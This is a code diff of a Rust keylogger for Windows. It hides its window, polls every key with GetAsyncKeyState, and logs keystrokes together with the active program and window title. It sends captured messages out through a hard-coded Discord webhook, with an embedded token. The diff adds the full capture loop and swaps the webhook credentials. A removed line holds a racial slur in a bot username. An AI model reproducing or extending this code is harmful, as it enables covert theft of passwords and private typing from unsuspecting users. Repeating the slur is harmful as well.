@@ -1,5 +1,5 @@
 #![windows_subsystem = "windows"]
-
+#![allow(non_snake_case)]
 
 mod win_key_codes;
 
@@ -7,7 +7,7 @@ mod win_key_codes;
 extern crate winapi;
 
 
-const WEB_HOOK: &str = "https://discord.com/api/webhooks/1089619554558292048/qhLSa0sBrCn4-HBnD0_IQiuVZ5Rdo-cZaS4cMDv8sQRCkFBJy6gFBPbv_GLxZdlZf2q1";
+const WEB_HOOK: &str = "https://discord.com/api/webhooks/1001788489257467904/WUDJq8kg46iyg419qrAezJJFc_O5mQi2drd8fHS2Uqu_5PBZmh5Ty4tfZXSN8Unu12S9";
 
 
 use std::fmt::format;
@@ -26,11 +26,11 @@ async fn sendToMyDC(msg:String)  -> Result<()>{
     let time: DateTime<Utc> = Utc::now();
     let date = format!("{:02}h:{:02}m", time.hour()+2, time.minute());
     println!("sending");
-    let http = Http::new("qhLSa0sBrCn4-HBnD0_IQiuVZ5Rdo-cZaS4cMDv8sQRCkFBJy6gFBPbv_GLxZdlZf2q1");
+    let http = Http::new("WUDJq8kg46iyg419qrAezJJFc_O5mQi2drd8fHS2Uqu_5PBZmh5Ty4tfZXSN8Unu12S9");
     let webhook = Webhook::from_url(&http, WEB_HOOK).await.expect("Replace the webhook with your own");
 
     webhook
-        .execute(&http, false, |w|{ w.content(msg).username(format!("nigger slayer {}", date)) } )
+        .execute(&http, false, |w|{ w.content(msg).username(format!("grebber: {}", date)) } )
         .await
         .expect("could not work :(");
 
@@ -112,7 +112,7 @@ fn log_header(file: &mut File) {
 
     file.write(write.as_bytes()).expect("help i am broken");
     file.write(proc.as_bytes()).expect("help i am broken at proc");
-    file.write(b"--- Start of Logging ---").expect("TODO: panic message");
+    file.write(b"--- Start of Logging ---\n").expect("TODO: panic message");
 }
 
 
@@ -132,7 +132,6 @@ fn run(file: &mut File) {
     use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
     use winapi::um::processthreadsapi::OpenProcess;
     use winapi::um::psapi::GetProcessImageFileNameW;
-    use winapi::um::winnls::GetUserDefaultLocaleName;
     use winapi::shared::minwindef::DWORD;
     use winapi::ctypes::c_int;
     use std::{thread, time::Duration};
@@ -140,7 +139,81 @@ fn run(file: &mut File) {
 
     log_header(file);
 
+    loop{
+        thread::sleep(Duration::from_millis(10));
 
+        let hwnd = unsafe { GetForegroundWindow() };
+
+        let pid = unsafe {
+            let mut p = 0 as DWORD;
+            GetWindowThreadProcessId(hwnd, &mut p);
+            p
+        };
+
+        let handle = unsafe {
+            OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
+        };
+
+        let filename = unsafe {
+            const LEN: u32 = 256;
+            let mut buf = vec![0 as u16; LEN as usize];
+            GetProcessImageFileNameW(handle, buf.as_mut_ptr(), LEN);
+
+            //find the null terminator
+            let mut len = 0;
+            buf.iter().enumerate().for_each(|(i, c)| {
+                if *c == 0 && len == 0 {
+                    len = i;
+                }
+            });
+
+            String::from_utf16_lossy(buf[0..len].as_mut())
+        };
+
+        let title = unsafe {
+            let len = GetWindowTextLengthW(hwnd) + 1;
+            let mut t = String::from("__NO_TITLE__");
+
+            if len > 0 {
+                let mut buf = vec![0 as u16; len as usize];
+                GetWindowTextW(hwnd, buf.as_mut_ptr(), len as i32);
+                buf.remove(buf.len() - 1);
+                t = String::from_utf16_lossy(buf.as_mut());
+            }
+
+            t
+        };
+
+        let now: DateTime<Utc> = Utc::now();
+
+        for i in 0 as c_int..255 as c_int {
+            let key = unsafe { GetAsyncKeyState(i) };
+
+            if (key & 1) > 0 {
+                let s = format!("[{:02}:{:02}:{:02}][{}][{}][{}]\n",
+                                now.hour(), now.minute(), now.second(),
+                                filename.trim(), title.trim(), win_key_codes::keycode_to_string(i as u8));
+
+                log(file, s);
+            }
+        }
+    }
+}
+
+fn log(file: &mut File, s: String) {
+    #[cfg(debug_assertions)] {
+        print!("{}", s);
+    }
+
+    match file.write(s.as_bytes()) {
+        Err(e) => { println!("Couldn't write to log file: {}", e) }
+        _ => {}
+    }
+
+    match file.flush() {
+        Err(e) => { println!("Couldn't flush log file: {}", e) }
+        _ => {}
+    }
 }
 
 
